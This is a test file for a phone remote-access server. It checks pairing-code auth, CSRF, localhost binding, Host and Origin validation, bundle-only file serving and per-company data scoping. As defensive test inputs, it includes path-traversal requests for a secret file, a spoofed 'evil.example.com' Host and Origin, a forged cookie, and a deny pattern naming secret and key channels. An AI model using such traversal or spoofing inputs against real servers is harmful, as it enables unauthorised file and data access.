/**
 * REMOTE.md: Phone. Auth (single-use, short-lived pairing; revoked tokens; CSRF), the server (127.0.0.1 only, nothing
 * when off, Host and Origin checks, only its own bundle), the API's company scoping and the live socket's fan-out.
 */
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import fs from 'node:fs'
import net from 'node:net'
import os from 'node:os'
import path from 'node:path'
import { WebSocket } from 'ws'
import type { CompanyAgent, CompanyPassport, CompanyTask, Department } from '@shared/company'
import type { AgentNode, Ask } from '@shared/live'
import type { Session } from '@shared/types'
import type { ForumChannel, ForumMember, ForumMessage } from '@shared/forum'
import type { ChatSnapshot } from '@shared/chat'
import { EMPTY_CHAT_META } from '@shared/chat'
import { REMOTE_COOKIE, REMOTE_CSRF_HEADER, REMOTE_PAIR_TTL_MS, matchRemoteRoute, remoteRoutePath, remoteStatusLine, REMOTE_ROUTES, type PhoneNeeds, type PhoneServerMsg, type PhoneSession, type PhoneTaskDetail, type PhoneTasks } from '@shared/remote'
import { HiveError } from '@shared/errors'
import { PairError, RemoteAuth } from './auth'
import { RemoteServer, bundleFiles, parseCookies } from './server'
import type { OrchSuggestion } from '../../shared/orchestrator'
import { PHONE_CHANNELS, PhoneApi, terminalReply, type PhoneHost } from './api'
import { RemoteService } from './service'
import { findCloudflared, parseTunnelUrl } from './tunnel'
import { askHeading, deskHistory, phoneChats, phoneCompanies, phoneNeeds, phoneNow, phoneOptions, runTitle, type PhoneData } from './views'

const T = '2026-10-25T10:00:00.000Z'

// ---------- fixtures: two companies, A (Northwind) and B (Harbor) ----------
const co = (id: string, name: string, x: Partial<CompanyPassport> = {}): CompanyPassport => ({ id, name, createdAt: T, updatedAt: T, slug: id, color: '#fff', sortOrder: 0, ...x }) as unknown as CompanyPassport
const seat = (id: string, companyId: string, name: string, x: Partial<CompanyAgent> = {}): CompanyAgent => ({ id, companyId, departmentId: null, kind: 'profile', refId: 'pr_1', name, archivedAt: null, pausedAt: null, createdAt: T, updatedAt: T, data: { autonomy: 'ask' }, ...x }) as unknown as CompanyAgent
const task = (id: string, companyId: string, x: Partial<CompanyTask> = {}): CompanyTask => ({ id, identifier: id.toUpperCase(), companyId, title: `Task ${id}`, description: '', status: 'todo', priority: 0, source: 'manual', sourceUrl: null, externalId: null, repoId: null, assigneeProfileId: null, parentId: null, dependencyIds: [], departmentId: null, agentId: null, blockReason: null, ask: null, report: null, doneNote: null, routing: null, pendingWake: null, runId: null, createdAt: T, updatedAt: T, ...x }) as unknown as CompanyTask
const node = (id: string, x: Partial<AgentNode & { companyId?: string }> = {}): AgentNode & { companyId?: string } =>
  ({ id, kind: 'step', parentId: null, rootId: id, sessionId: null, runId: null, stepId: null, provider: 'claude', repoId: null, cwd: '/', title: id, agentType: null, externalId: null, toolUseId: null, model: null, depth: 0, background: false, attribution: 'exact', status: 'working', needs: null, activity: null, lastTool: null, toolCount: 0, memReads: 0, filesTouched: [], tokensIn: null, tokensOut: null, costUsd: null, modelUsage: null, report: null, startedAt: T, updatedAt: T, endedAt: null, ...x }) as AgentNode & { companyId?: string }
const ask = (id: string, x: Partial<Ask & { companyId?: string }> = {}): Ask & { companyId?: string } => ({ id, agentId: 'a', rootId: 'a', sessionId: null, runId: null, stepId: null, provider: 'claude', kind: 'permission', channel: 'stdio', title: id, detail: null, toolName: null, toolInput: null, question: null, options: [], status: 'open', answer: null, answeredVia: null, createdAt: T, answeredAt: null, expiresAt: null, ...x })
const sess = (id: string, companyId: string, x: Partial<Session> = {}): Session => ({ id, companyId, title: `Chat ${id}`, adapter: 'claude', status: 'running', startedAt: T, endedAt: null, repoId: null, cwd: '/tmp/x', ...x }) as unknown as Session
const channel = (id: string, companyId: string, x: Partial<ForumChannel> = {}): ForumChannel => ({ id, companyId, kind: 'public', name: 'general', topic: '', purpose: '', departmentId: null, system: 'general', createdBy: null, createdAt: T, archivedAt: null, memberIds: [], lastSeq: 0, lastMessageAt: null, joined: true, lastReadSeq: 0, unread: 0, mentions: 0, ...x })
const member = (id: string, companyId: string, x: Partial<ForumMember> = {}): ForumMember => ({ id, companyId, kind: 'agent', role: 'agent', agentId: null, handle: id, name: id, status: 'active', createdAt: T, data: {}, ...x })
const msg = (id: string, companyId: string, channelId: string, text: string): ForumMessage => ({ id, seq: 1, ref: 'm1', companyId, channelId, threadId: null, authorId: 'mb_owner_a', kind: 'text', text, createdAt: T, editedAt: null, deletedAt: null, replyCount: 0, lastReplyAt: null, repliers: [], mentions: [], mentionDepartments: [], refs: [], reactions: {}, origin: 'local' })
const snap = (id: string, items: ChatSnapshot['items'] = []): ChatSnapshot => ({ sessionId: id, mode: 'chat', available: true, turn: 'idle', activity: null, turnStartedAt: null, items, queue: [], meta: { ...EMPTY_CHAT_META }, seq: 1, note: null })

function world() {
  const d = {
    settings: { experimental: { companies: true, departments: true }, personas: true },
    companies: [co('co_a', 'Northwind'), co('co_b', 'Harbor'), co('co_personal', 'Personal', { system: 'personal' } as Partial<CompanyPassport>), co('co_old', 'Archived', { archivedAt: T })],
    seats: [seat('ag_a', 'co_a', 'Copywriter'), seat('ag_b', 'co_b', 'Front desk')],
    tasks: [
      task('ta_run', 'co_a', { status: 'in_progress', agentId: 'ag_a', runId: 'run_a', title: 'Spring menu' }),
      task('ta_rev', 'co_a', { status: 'in_review', agentId: 'ag_a', title: 'Instagram week', report: { outcome: 'review', summary: 'Seven posts are ready.', evidence: [], at: T } }),
      task('tb_rev', 'co_b', { status: 'in_review', agentId: 'ag_b', title: 'Recall letters', report: { outcome: 'review', summary: 'Letters drafted.', evidence: [], at: T } })
    ],
    agents: [node('n_a', { runId: 'run_a', activity: 'Bash git status', companyId: 'co_a' }), node('n_sb', { kind: 'session', sessionId: 'se_b', status: 'idle', needs: 'idle', companyId: 'co_b', report: 'All set.' })],
    asks: [
      ask('ask_a', { agentId: 'n_a', rootId: 'n_a', runId: 'run_a', companyId: 'co_a', options: [{ id: 'allow', label: 'Allow', kind: 'allow' }, { id: 'deny', label: 'Deny', kind: 'deny' }, { id: 'always', label: 'Always', kind: 'allow_always' }, { id: 'focus', label: 'Open', kind: 'focus' }] }),
      ask('ask_b', { agentId: 'n_sb', rootId: 'n_sb', sessionId: 'se_b', companyId: 'co_b', options: [{ id: 'allow', label: 'Allow', kind: 'allow' }, { id: 'sug_0', label: 'Always allow git', kind: 'allow' }, { id: 'step', label: 'Allow this step', kind: 'allow_step' }] })
    ],
    sessions: [sess('se_a', 'co_a'), sess('se_b', 'co_b')],
    channels: [channel('ch_a', 'co_a'), channel('ch_b', 'co_b')],
    members: [member('mb_owner_a', 'co_a', { kind: 'human', role: 'owner', handle: 'you' }), member('mb_ag_a', 'co_a', { agentId: 'ag_a', handle: 'livia', name: 'Livia' }), member('mb_ag_b', 'co_b', { agentId: 'ag_b', handle: 'marcus' })],
    runs: [] as { id: string; companyId: string; agentId: string | null; title: string; status: string }[],
    calls: [] as { channel: string; req: unknown }[],
    suggestions: [] as OrchSuggestion[],
    /** the room's messages (null: one "hello") */
    roomMessages: null as ForumMessage[] | null
  }
  const listeners = new Set<(e: string, p: unknown) => void>()
  const host: PhoneHost = {
    invoke: (async (channel: string, req: any) => {
      d.calls.push({ channel, req })
      switch (channel) {
        case 'settings:get': return d.settings
        case 'company:list': return d.companies
        case 'agents:list': return req?.runId ? d.agents.filter((a) => a.runId === req.runId) : d.agents
        case 'asks:list': return d.asks
        case 'sessions:list': return d.sessions
        case 'tasks:list': return d.tasks
        case 'tasks:get': return { task: d.tasks.find((t) => t.id === req.id), activity: [] }
        case 'companyAgents:list': return req?.companyId ? d.seats.filter((s) => s.companyId === req.companyId) : d.seats
        case 'departments:list': return [] as Department[]
        case 'repos:list': return []
        case 'orchestrator:suggestions': return d.suggestions
        case 'runs:list': return d.runs.filter((r) => !req?.companyId || r.companyId === req.companyId)
        case 'chat:snapshot': return snap(req.id)
        case 'app:dashboard': return { done: [] }
        case 'forum:state': return { companyId: req.companyId, me: 'mb_owner_a', members: d.members.filter((m) => m.companyId === req.companyId), channels: d.channels.filter((c) => c.companyId === req.companyId), presence: [], openAsks: 0, openProposals: 0 }
        case 'forum:messages': return { messages: d.roomMessages ?? [msg('fm_1', req.companyId, req.channelId, 'hello')], hasMore: false }
        case 'forum:post': return msg('fm_2', req.companyId, req.channelId, req.text)
        case 'chat:sendAgent': return { id: 'se_agent', companyId: 'co_a', companyAgentId: req.agentId }
        case 'sessions:restart': return { ...sess('se_next', 'co_a'), agentSessionId: d.sessions.find((x) => x.id === req.id)?.agentSessionId ?? null }
        default: return { ok: true }
      }
    }) as PhoneHost['invoke'],
    newChat: async (req) => {
      d.calls.push({ channel: 'newChat', req })
      return sess('se_new', req.companyId)
    },
    onEvent: (fn) => {
      const f = fn as (e: string, p: unknown) => void
      listeners.add(f)
      return () => void listeners.delete(f)
    }
  }
  const fire = (e: string, p: unknown): void => listeners.forEach((f) => f(e, p))
  return { d, host, fire }
}
const dev = { id: 'dev_1', name: 'Phone', hash: 'x'.repeat(64), createdAt: T, lastSeenAt: null, prevHash: null, prevUntil: null, expiresAt: '2099-01-01T00:00:00.000Z' }

// ---------- auth ----------
describe('RemoteAuth (RA2)', () => {
  it('a pairing code works once, then says the link expired', () => {
    const a = new RemoteAuth()
    const { code } = a.createCode()
    expect(code).toMatch(/^[0-9a-f]{32}$/)
    const { token, device } = a.pair(code, 'My iPhone')
    expect(device.name).toBe('My iPhone')
    expect(a.verify(token)?.id).toBe(device.id)
    expect(() => a.pair(code, 'Again')).toThrow(/expired/)
  })
  it('a code expires after its TTL', () => {
    let now = 1_000_000
    const a = new RemoteAuth({ now: () => now })
    const { code } = a.createCode()
    now += REMOTE_PAIR_TTL_MS + 1
    expect(() => a.pair(code, 'x')).toThrow(PairError)
  })
  it('wrong codes are rate limited per caller (5 a minute); a live code always pairs', () => {
    let now = 0
    const a = new RemoteAuth({ now: () => now })
    for (let i = 0; i < 5; i++) expect(() => a.pair('0'.repeat(32), 'x', 'cf:1.1.1.1')).toThrow(/expired/)
    expect(() => a.pair('0'.repeat(32), 'x', 'cf:1.1.1.1')).toThrow(/Too many/)
    // someone else is not locked out by that caller's junk
    expect(() => a.pair('0'.repeat(32), 'x', 'cf:2.2.2.2')).toThrow(/expired/)
    // and the founder's fresh code works even from the locked-out address
    expect(a.pair(a.createCode().code, 'x', 'cf:1.1.1.1').token).toBeTruthy()
    now += 61_000
    expect(() => a.pair('0'.repeat(32), 'x', 'cf:1.1.1.1')).toThrow(/expired/)
  })
  it('a flood of wrong codes from many callers hits the overall ceiling', () => {
    const a = new RemoteAuth({ now: () => 0 })
    for (let i = 0; i < 60; i++) expect(() => a.pair('0'.repeat(32), 'x', `cf:10.0.0.${i}`)).toThrow(/expired/)
    expect(() => a.pair('0'.repeat(32), 'x', 'cf:10.0.1.1')).toThrow(/Too many/)
    expect(a.pair(a.createCode().code, 'x', 'cf:10.0.1.1').token).toBeTruthy()
  })
  it('New code cancels the earlier codes', () => {
    const a = new RemoteAuth()
    const one = a.createCode().code
    const two = a.createCode().code
    expect(() => a.pair(one, 'x')).toThrow(/expired/)
    expect(a.pair(two, 'x').token).toBeTruthy()
  })
  it('only the hash is kept; a revoked or unknown token is refused; reset signs everyone out', () => {
    const a = new RemoteAuth()
    const { token, device } = a.pair(a.createCode().code, 'p')
    expect(JSON.stringify(a.devices())).not.toContain(token)
    expect(a.verify('nope')).toBeNull()
    a.revoke(device.id)
    expect(a.verify(token)).toBeNull()
    const two = a.pair(a.createCode().code, 'q')
    a.reset()
    expect(a.verify(two.token)).toBeNull()
    expect(a.devices()).toEqual([])
  })
  it('CSRF is bound to the device', () => {
    const a = new RemoteAuth()
    const x = a.pair(a.createCode().code, 'x').device
    const y = a.pair(a.createCode().code, 'y').device
    expect(a.checkCsrf(x.id, a.csrfFor(x.id))).toBe(true)
    expect(a.checkCsrf(x.id, a.csrfFor(y.id))).toBe(false)
    expect(a.checkCsrf(x.id, undefined)).toBe(false)
  })
  it('names are cleaned and capped', () => {
    const a = new RemoteAuth()
    expect(a.pair(a.createCode().code, '  \u0007Pho\u0000ne  ').device.name).toBe('Phone')
    expect(a.pair(a.createCode().code, 42).device.name).toBe('Phone')
    expect(a.pair(a.createCode().code, 'x'.repeat(200)).device.name).toHaveLength(60)
  })
})

describe('routes and helpers', () => {
  it('route paths round-trip and only listed routes match', () => {
    expect(remoteRoutePath('session', { companyId: 'co_a', sessionId: 'se_1' })).toBe('/api/c/co_a/sessions/se_1')
    expect(matchRemoteRoute('GET', '/api/c/co_a/sessions/se_1')).toEqual({ name: 'session', params: { companyId: 'co_a', sessionId: 'se_1' } })
    expect(matchRemoteRoute('POST', '/api/c/co_a/sessions/se_1')).toBeNull()
    expect(matchRemoteRoute('GET', '/api/c/co_a/../secrets')).toBeNull()
    expect(Object.keys(REMOTE_ROUTES).every((k) => !/secret|key|setting|terminal|repo|workflow|delete/i.test(REMOTE_ROUTES[k as keyof typeof REMOTE_ROUTES]))).toBe(true)
  })
  it('the phone reaches only its fixed list of desktop channels: no settings writes, keys, ptys, repos, workflows, deletes', () => {
    for (const c of PHONE_CHANNELS) expect(c).not.toMatch(/^(secrets|sessions:(create|kill|remove|write)|repos:(add|remove|pick|update|move)|workflows|schedules|profiles|settings:update|marketplace|memory|cloud|slack:connect|gateway|processes|usage:cleanup|company:(archive|create|update|save|import))/)
    expect(PHONE_CHANNELS).not.toContain('settings:update')
    expect(PHONE_CHANNELS.some((c) => /remove|delete|trash|kill/.test(c))).toBe(false)
  })
  it('status line, cookies, tunnel helpers', () => {
    expect(remoteStatusLine({ enabled: false, devices: [] })).toBe('')
    expect(remoteStatusLine({ enabled: true, devices: [{ id: 'd', name: 'p', createdAt: T, lastSeenAt: null, online: true }] })).toBe('Phone on · 1 device')
    expect(parseCookies('a=1; pp_device=abc; b=2')).toEqual({ a: '1', pp_device: 'abc', b: '2' })
    expect(parseTunnelUrl('INF |  https://quiet-tree-42.trycloudflare.com  |')).toBe('https://quiet-tree-42.trycloudflare.com')
    expect(parseTunnelUrl('https://evil.example.com')).toBeNull()
    // cloudflared's own service host in an error line is not the tunnel
    expect(parseTunnelUrl('ERR failed to request quick Tunnel: Post "https://api.trycloudflare.com/tunnel": dial tcp: no such host')).toBeNull()
    expect(parseTunnelUrl('ERR Post "https://api.trycloudflare.com/tunnel"\nINF |  https://calm-sea-7.trycloudflare.com  |')).toBe('https://calm-sea-7.trycloudflare.com')
    expect(findCloudflared('/a:/b', (p) => p === '/b/cloudflared')).toBe('/b/cloudflared')
    expect(findCloudflared('', () => false)).toBeNull()
  })
})

// ---------- server ----------
describe('RemoteServer (RA1, RA2)', () => {
  let dir: string
  let server: RemoteServer
  let auth: RemoteAuth
  let base: string
  beforeEach(async () => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'phone-bundle-'))
    fs.mkdirSync(path.join(dir, 'assets'))
    fs.writeFileSync(path.join(dir, 'index.html'), '<!doctype html><title>Phone</title>')
    fs.writeFileSync(path.join(dir, 'assets', 'app-1.js'), 'console.log(1)')
    fs.writeFileSync(path.join(path.dirname(dir), 'secret.txt'), 'nope')
    auth = new RemoteAuth()
    const { host } = world()
    server = new RemoteServer({ auth, api: new PhoneApi(host), bundleDir: dir, extraHosts: () => ['quiet-tree-42.trycloudflare.com'] })
    const port = await server.start()
    base = `http://127.0.0.1:${port}`
  })
  afterEach(async () => {
    await server.stop()
    fs.rmSync(dir, { recursive: true, force: true })
  })
  const pair = async (): Promise<{ cookie: string; csrf: string }> => {
    const r = await fetch(`${base}/api/pair`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ code: auth.createCode().code, name: 'Test phone' }) })
    expect(r.status).toBe(200)
    const set = r.headers.get('set-cookie')!
    expect(set).toMatch(/HttpOnly/)
    expect(set).toMatch(/Secure/)
    expect(set).toMatch(/SameSite=Strict/)
    const cookie = set.split(';')[0]!
    const me = await fetch(`${base}/api/me`, { headers: { cookie } })
    const body = (await me.json()) as { csrf: string; companies: { id: string }[] }
    expect(body.csrf).toBeTruthy()
    return { cookie, csrf: body.csrf }
  }

  it('listens on 127.0.0.1 only', () => {
    expect(server.address?.address).toBe('127.0.0.1')
  })
  it('every API request needs the device token', async () => {
    expect((await fetch(`${base}/api/me`)).status).toBe(401)
    expect((await fetch(`${base}/api/c/co_a/now`, { headers: { cookie: `${REMOTE_COOKIE}=forged` } })).status).toBe(401)
  })
  it('writes need the CSRF header and JSON', async () => {
    const { cookie, csrf } = await pair()
    const url = `${base}/api/c/co_a/pause`
    expect((await fetch(url, { method: 'POST', headers: { cookie, 'content-type': 'application/json' }, body: '{"paused":true}' })).status).toBe(403)
    expect((await fetch(url, { method: 'POST', headers: { cookie, 'content-type': 'application/json', [REMOTE_CSRF_HEADER]: 'wrong' }, body: '{"paused":true}' })).status).toBe(403)
    expect((await fetch(url, { method: 'POST', headers: { cookie, 'content-type': 'text/plain', [REMOTE_CSRF_HEADER]: csrf }, body: '{"paused":true}' })).status).toBe(415)
    expect((await fetch(url, { method: 'POST', headers: { cookie, 'content-type': 'application/json', [REMOTE_CSRF_HEADER]: csrf }, body: '{"paused":true}' })).status).toBe(200)
  })
  it('a revoked device is refused at once', async () => {
    const { cookie } = await pair()
    auth.revoke(auth.devices()[0]!.id)
    expect((await fetch(`${base}/api/me`, { headers: { cookie } })).status).toBe(401)
  })
  it('a used or wrong pairing code is refused', async () => {
    const { code } = auth.createCode()
    const post = (c: string) => fetch(`${base}/api/pair`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ code: c, name: 'x' }) })
    expect((await post(code)).status).toBe(200)
    expect((await post(code)).status).toBe(400)
    expect((await post('f'.repeat(32))).status).toBe(400)
  })
  it('unknown Host headers are refused (DNS rebinding); the tunnel host is fine', async () => {
    const port = server.address!.port
    const get = (host: string) =>
      new Promise<number>((resolve) => {
        const s = net.connect(port, '127.0.0.1', () => s.write(`GET /api/me HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`))
        let buf = ''
        s.on('data', (c) => (buf += c.toString()))
        s.on('end', () => resolve(Number(/HTTP\/1\.1 (\d+)/.exec(buf)?.[1])))
      })
    expect(await get('evil.example.com')).toBe(421)
    expect(await get(`127.0.0.1:${port}`)).toBe(401)
    expect(await get('quiet-tree-42.trycloudflare.com')).toBe(401)
  })
  it('serves only files of its own bundle', async () => {
    expect((await fetch(`${base}/`)).status).toBe(200)
    expect(await (await fetch(`${base}/assets/app-1.js`)).text()).toBe('console.log(1)')
    expect((await fetch(`${base}/../secret.txt`)).status).not.toBe(200)
    expect((await fetch(`${base}/%2e%2e/secret.txt`)).status).toBe(404)
    expect((await fetch(`${base}/assets/..%2f..%2fsecret.txt`)).status).toBe(404)
    const r = await fetch(`${base}/`)
    expect(r.headers.get('content-security-policy')).toMatch(/default-src 'self'/)
    expect(r.headers.get('x-frame-options')).toBe('DENY')
    expect([...bundleFiles(dir).keys()].sort()).toEqual(['/assets/app-1.js', '/index.html'])
  })
  it('the live socket needs the cookie and our own Origin', async () => {
    const { cookie } = await pair()
    const host = `127.0.0.1:${server.address!.port}`
    const open = (headers: Record<string, string>) =>
      new Promise<string>((resolve) => {
        const ws = new WebSocket(`ws://${host}/api/live`, { headers })
        ws.on('message', (m) => (resolve(String(m)), ws.close()))
        ws.on('error', () => resolve('refused'))
        ws.on('unexpected-response', () => resolve('refused'))
      })
    expect(await open({ origin: `http://${host}` })).toBe('refused')
    expect(await open({ cookie, origin: 'https://evil.example.com' })).toBe('refused')
    expect(JSON.parse(await open({ cookie, origin: `http://${host}` }))).toEqual({ t: 'hello' })
  })
})

describe('RemoteService (RA1: off by default, off closes everything)', () => {
  it('nothing listens until it is turned on; off closes the port and keeps phones paired', async () => {
    const { host } = world()
    const states: unknown[] = []
    const svc = new RemoteService({ host, bundleDir: null, emit: (s) => states.push(s), tunnel: { bin: () => null } })
    expect(svc.state().enabled).toBe(false)
    expect(() => svc.pairLink()).toThrow(/Turn Phone on/)
    const on = await svc.setEnabled(true)
    expect(on.enabled).toBe(true)
    expect(on.localUrl).toMatch(/^http:\/\/127\.0\.0\.1:\d+$/)
    const link = svc.pairLink()
    expect(link.link).toMatch(/\/#pair=[0-9a-f]{32}$/)
    expect(link.public).toBe(false)
    const port = Number(new URL(on.localUrl!).port)
    const r = await fetch(`${on.localUrl}/api/pair`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ code: link.link.split('#pair=')[1], name: 'p' }) })
    expect(r.status).toBe(200)
    expect(svc.state().devices).toHaveLength(1)
    // no cloudflared: a state with the install line, not a crash
    const t = await svc.setTunnel(true)
    expect(t.tunnel.state).toBe('missing')
    expect(t.tunnel.message).toMatch(/brew install cloudflared/)
    const off = await svc.setEnabled(false)
    expect(off.enabled).toBe(false)
    expect(off.devices).toHaveLength(1)
    const refused = await new Promise<boolean>((resolve) => {
      const s = net.connect(port, '127.0.0.1')
      s.on('connect', () => (s.destroy(), resolve(false)))
      s.on('error', () => resolve(true))
    })
    expect(refused).toBe(true)
    expect(states.length).toBeGreaterThan(0)
  })
})

// ---------- API: company scoping ----------
describe('PhoneApi scoping (RA3: each view is one company, no cross-company leak)', () => {
  it('me lists the companies (archived ones are not)', async () => {
    const { host } = world()
    const api = new PhoneApi(host)
    const me = (await api.handle('me', {}, {}, dev)) as { companies: { id: string; name: string }[] }
    expect(me.companies.map((c) => c.id)).toEqual(['co_a', 'co_b', 'co_personal'])
  })
  it('an unknown or archived company is 404', async () => {
    const api = new PhoneApi(world().host)
    await expect(api.handle('now', { companyId: 'co_old' }, {}, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('now', { companyId: 'co_zzz' }, {}, dev)).rejects.toMatchObject({ status: 404 })
  })
  it('ids of another company are 404 in every route', async () => {
    const { host, d } = world()
    const api = new PhoneApi(host)
    const A = { companyId: 'co_a' }
    await expect(api.handle('session', { ...A, sessionId: 'se_b' }, {}, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('sessionSend', { ...A, sessionId: 'se_b' }, { text: 'hi' }, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('agent', { ...A, agentId: 'ag_b' }, {}, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('agentSend', { ...A, agentId: 'ag_b' }, { text: 'hi' }, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('answerAsk', { ...A, askId: 'ask_b' }, { optionId: 'allow' }, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('approveTask', { ...A, taskId: 'tb_rev' }, {}, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('sendBackTask', { ...A, taskId: 'tb_rev' }, { text: 'no' }, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('room', { ...A, channelId: 'ch_b' }, {}, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('roomPost', A, { channelId: 'ch_b', text: 'hi' }, dev)).rejects.toMatchObject({ status: 404 })
    // nothing was written
    expect(d.calls.filter((c) => /answer|approve|sendBack|send|post|create|comment/.test(c.channel))).toEqual([])
  })
  it('views carry only their company', async () => {
    const api = new PhoneApi(world().host)
    const needs = (await api.handle('needs', { companyId: 'co_a' }, {}, dev)) as PhoneNeeds
    expect(needs.asks.map((a) => a.id)).toEqual(['ask_a'])
    expect(needs.tasks.map((t) => t.taskId)).toEqual(['ta_rev'])
    const chats = (await api.handle('chats', { companyId: 'co_a' }, {}, dev)) as { rows: { key: string }[] }
    expect(chats.rows.map((r) => r.key).sort()).toEqual(['agent:ag_a', 'session:se_a'])
    const text = JSON.stringify([needs, chats, await api.handle('now', { companyId: 'co_a' }, {}, dev), await api.handle('room', { companyId: 'co_a' }, {}, dev)])
    for (const leak of ['co_b', 'se_b', 'ag_b', 'ask_b', 'tb_rev', 'Harbor', 'Recall letters', 'marcus', 'ch_b']) expect(text).not.toContain(leak)
  })
  it('the board (tasks, task): one company, read only, redacted, Done only for 7 days', async () => {
    const { host, d } = world()
    const now = Date.now()
    const ago = (days: number): string => new Date(now - days * 86_400_000).toISOString()
    d.tasks.push(
      task('ta_todo', 'co_a', { status: 'todo', priority: 1, title: 'Price list with key sk-live-SECRET', description: 'Use sk-live-SECRET for the shop' }),
      task('ta_blk', 'co_a', { status: 'blocked', blockReason: 'deps', title: 'Launch post' }),
      task('ta_done', 'co_a', { status: 'done', agentId: 'ag_a', updatedAt: ago(2), title: 'Logo', report: { outcome: 'review', summary: 'Three logos.', evidence: [], at: T } }),
      task('ta_old', 'co_a', { status: 'done', updatedAt: ago(9), title: 'Old thing' }),
      task('ta_cxl', 'co_a', { status: 'canceled', title: 'Dropped' }),
      task('tb_todo', 'co_b', { status: 'todo', title: 'Harbor plan' })
    )
    const api = new PhoneApi({ ...host, redact: (s) => s.replace(/sk-live-\w+/g, '••••SHOP_KEY') })
    const writes = d.calls.length
    const b = (await api.handle('tasks', { companyId: 'co_a' }, {}, dev)) as PhoneTasks
    expect(b.planned.map((t) => t.id)).toEqual(['ta_todo', 'ta_blk'])
    expect(b.planned[1]!.line).toBe('Waits for another task')
    expect(b.working.map((t) => t.id)).toEqual(['ta_run'])
    expect(b.working[0]!.who?.name).toBeTruthy()
    expect(b.needs.map((t) => t.id)).toEqual(['ta_rev'])
    expect(b.needs[0]!.line).toBe('Ready for your OK')
    expect(b.done.map((t) => t.id)).toEqual(['ta_done'])
    const text = JSON.stringify(b)
    for (const leak of ['co_b', 'tb_', 'Harbor', 'Recall letters', 'ta_old', 'Dropped', 'sk-live']) expect(text).not.toContain(leak)
    expect(text).toContain('••••SHOP_KEY')

    const one = (await api.handle('task', { companyId: 'co_a', taskId: 'ta_todo' }, {}, dev)) as PhoneTaskDetail
    expect(one.description).toBe('Use ••••SHOP_KEY for the shop')
    expect(one.need).toBeNull()
    const rev = (await api.handle('task', { companyId: 'co_a', taskId: 'ta_rev' }, {}, dev)) as PhoneTaskDetail
    expect(rev).toMatchObject({ column: 'needs', summary: 'Seven posts are ready.', need: { kind: 'review', taskId: 'ta_rev' } })
    // another company's task, a canceled one, an unknown id: 404
    await expect(api.handle('task', { companyId: 'co_a', taskId: 'tb_rev' }, {}, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('task', { companyId: 'co_a', taskId: 'ta_cxl' }, {}, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('task', { companyId: 'co_a', taskId: 'nope' }, {}, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('tasks', { companyId: 'co_zzz' }, {}, dev)).rejects.toMatchObject({ status: 404 })
    // read only: nothing but reads went to the desktop
    expect(d.calls.slice(writes).filter((c) => !/:(list|get|state|summary|suggestions)$/.test(c.channel))).toEqual([])
    expect(matchRemoteRoute('GET', '/api/c/co_a/tasks')).toEqual({ name: 'tasks', params: { companyId: 'co_a' } })
    expect(matchRemoteRoute('GET', '/api/c/co_a/tasks/ta_1')).toEqual({ name: 'task', params: { companyId: 'co_a', taskId: 'ta_1' } })
    expect(matchRemoteRoute('POST', '/api/c/co_a/tasks')).toBeNull()
  })
  it('the board redacts before it clips: a secret at the cut never leaks its first characters', async () => {
    const { host, d } = world()
    const key = 'sk-live-' + 'A1b2C3d4'.repeat(4)
    d.tasks.push(task('ta_long', 'co_a', { status: 'todo', title: 'x'.repeat(190) + ' ' + key, description: 'y'.repeat(3970) + key }))
    const api = new PhoneApi({ ...host, redact: (s) => s.split(key).join('••••SHOP_KEY') })
    const text = JSON.stringify([await api.handle('tasks', { companyId: 'co_a' }, {}, dev), await api.handle('task', { companyId: 'co_a', taskId: 'ta_long' }, {}, dev)])
    expect(text).not.toContain('sk-live-A1b2')
  })
  it('Principia\'s open suggestions count in Needs you and show for their company only (decided on the Mac)', async () => {
    const { host, d } = world()
    const sg = (id: string, companyId: string): OrchSuggestion => ({ id, companyId, kind: 'routine', title: `Idea ${id}`, detail: 'Every weekday.', status: 'open', createdAt: T, decidedAt: null })
    d.suggestions = [sg('osg_a', 'co_a'), sg('osg_b', 'co_b')]
    const api = new PhoneApi(host)
    const before = (await new PhoneApi(world().host).handle('needs', { companyId: 'co_a' }, {}, dev)) as PhoneNeeds
    const needs = (await api.handle('needs', { companyId: 'co_a' }, {}, dev)) as PhoneNeeds
    expect(needs.count).toBe(before.count + 1)
    const idea = needs.tasks.find((t) => t.kind === 'idea')!
    expect(idea).toMatchObject({ taskId: 'osg_a', title: 'Idea osg_a' })
    expect(idea.text).toContain('Decide on your Mac')
    expect(JSON.stringify(needs)).not.toContain('osg_b')
  })
  it('answers go through the desktop actions, with the phone’s limits', async () => {
    const { host, d } = world()
    const api = new PhoneApi(host)
    await expect(api.handle('answerAsk', { companyId: 'co_a', askId: 'ask_a' }, { optionId: 'always' }, dev)).rejects.toMatchObject({ status: 400 })
    await expect(api.handle('answerAsk', { companyId: 'co_a', askId: 'ask_a' }, { optionId: 'focus' }, dev)).rejects.toMatchObject({ status: 400 })
    await api.handle('answerAsk', { companyId: 'co_a', askId: 'ask_a' }, { optionId: 'allow' }, dev)
    expect(d.calls.find((c) => c.channel === 'asks:answer')?.req).toEqual({ askId: 'ask_a', optionId: 'allow' })
    await api.handle('approveTask', { companyId: 'co_a', taskId: 'ta_rev' }, {}, dev)
    expect(d.calls.find((c) => c.channel === 'tasks:approve')?.req).toEqual({ id: 'ta_rev', doneNote: 'Approved: Seven posts are ready.' })
    await expect(api.handle('approveTask', { companyId: 'co_a', taskId: 'ta_run' }, {}, dev)).rejects.toMatchObject({ status: 409 })
    // Not needed: a task waiting on you is canceled (status only); one that does not wait on you is refused
    await api.handle('cancelTask', { companyId: 'co_a', taskId: 'ta_rev' }, {}, dev)
